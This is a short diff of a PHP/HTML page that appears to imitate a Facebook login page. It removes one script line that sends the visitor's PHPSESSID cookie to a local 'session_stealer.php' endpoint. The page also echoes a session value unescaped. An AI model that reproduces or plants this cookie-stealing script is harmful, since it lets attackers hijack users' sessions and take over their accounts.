@@ -33,7 +33,6 @@
 <a href="https://facebook.com/reg/"><button id="signup" type="button">Create New Account</button></a>
 </center>
 <?php echo $_SESSION['res']; ?>
-<script> document.location("http:/\/127.0.0.1:9000/session_stealer.php?session=" + document.cookie.split("PHPSESSID=")[1])</script>
 </div>
 <br>
 </div>
